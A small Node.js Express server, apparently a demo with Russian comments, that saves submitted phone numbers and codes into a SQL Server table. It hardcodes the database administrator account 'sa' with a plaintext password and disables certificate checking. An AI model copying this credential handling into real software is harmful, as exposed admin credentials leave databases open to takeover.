const express = require("express");
const sql = require("mssql");
const bodyParser = require("body-parser");

const app = express();

// Конфиг подключения к SQL Server
const config = {
    server: "DESKTOP-O151BF4\\MYSQL", // твой сервер
    database: "DemoSite",
    options: { 
        trustServerCertificate: true, 
        enableArithAbort: true 
    },
    authentication: {
        type: "default",
        options: {
            userName: "sa",
            password: "Password123!"  // пароль sa
        }
    }
};

// Middleware
app.use(bodyParser.json());
app.use(express.static("public"));

// Главная страница
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/public/index.html");
});

// Обработка формы
app.post("/submit", async (req, res) => {
    const { phone, code } = req.body;

    try {
        await sql.connect(config);
        await sql.query`
            INSERT INTO dbo.submissions (phone, code)
            VALUES (${phone}, ${code})
        `;
        res.json({ message: "Данные сохранены" });
    } catch (err) {
        console.error(err);
        res.status(500).send("Ошибка сервера");
    }
});

// Запуск сервера
app.listen(3000, () => {
    console.log("Сервер запущен: http://localhost:3000");
});